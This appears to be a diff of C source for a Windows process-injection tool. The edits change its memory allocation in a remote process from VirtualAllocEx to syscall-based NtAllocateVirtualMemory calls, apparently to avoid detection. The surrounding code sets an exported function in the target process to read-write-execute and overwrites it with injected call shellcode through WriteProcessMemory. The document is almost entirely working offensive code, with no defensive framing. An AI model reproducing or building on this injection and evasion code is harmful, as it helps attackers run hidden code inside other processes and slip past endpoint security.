@@ -121,7 +121,7 @@ int main(int argc, char** argv)
 	printf("  [+] %s Address: 0x%p\n\n", exportedFunction, exportedFunctionAddress);
 
 
-	printf("[V] NtOpenProcess [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", g_Nt.NtOpenProcess.dwSSn, g_Nt.NtOpenProcess.pSyscallInstAddress);
+	//printf("[V] NtOpenProcess [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", g_Nt.NtOpenProcess.dwSSn, g_Nt.NtOpenProcess.pSyscallInstAddress);
 	
 	// Opening a Process /w Syscall
 	HANDLE hProcess = NULL;
@@ -167,20 +167,33 @@ int main(int argc, char** argv)
 
 	//Chaning the memory protection settings of the exported function into the calling process to RWX
 	printf("[*] Changing the memory protection of %s to RWX\n", exportedFunction);
+
+	/*DWORD oldProtect = 0;
+	SIZE_T sizezz = 8;
+	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
+	if (!NT_SUCCESS(STATUS = RunSyscall(hProcess, &exportedFunctionAddress, 0, &sizezz, PAGE_EXECUTE_READWRITE, &oldProtect))) {
+		return FALSE;
+	}
+	*/
+
 	DWORD oldProtect = 0;
 	if (!VirtualProtectEx(hProcess, exportedFunctionAddress, 8, PAGE_EXECUTE_READWRITE, &oldProtect))
 	{
 		printf("  [Error] Could not change the memory protection settings\n");
 		return -99;
 	}
+	
 	printf("  [+] Successfully changed the memory protection settings of %s to RWX\n", exportedFunction);
 
 	// Injecting a call instruction into the exported function
 	printf("[*] Trying to inject the call assembly for the exported function\n");
+
 	int callPointerAddress = (memoryHoleAddress - ((UINT_PTR)exportedFunctionAddress + 5));
 	unsigned char callFunctionShellcode[] = { 0xe8, 0, 0, 0, 0 };
 	*(int*)(callFunctionShellcode + 1) = callPointerAddress;
+
 	VirtualProtectEx(hProcess, callFunctionShellcode, sizeof(callFunctionShellcode), PAGE_EXECUTE_READWRITE, NULL);
+
 	if (!WriteProcessMemory(hProcess, exportedFunctionAddress, callFunctionShellcode, sizeof(callFunctionShellcode), &writtenBytes))
 	{
 		printf("  [Error] Could redirect %s\n", exportedFunction);
@@ -225,8 +238,14 @@ int64_t FindMemoryHole(IN HANDLE hProcess, IN void** exportedFunctionAddress, IN
 		remoteAddress < exportAddress + 0x70000000;
 		remoteAddress += 0x10000)
 	{
-		LPVOID lpAddr = VirtualAllocEx(hProcess, remoteAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-		if (lpAddr == NULL)
+		// YOU CAN DO IT ONLY ONCE!!!!!
+		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
+		if (!NT_SUCCESS(STATUS = RunSyscall(hProcess, &remoteAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+			printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
+			return FALSE;
+		}
+		//LPVOID lpAddr = VirtualAllocEx(hProcess, remoteAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		if (remoteAddress == NULL)
 		{
 			continue;
 		}
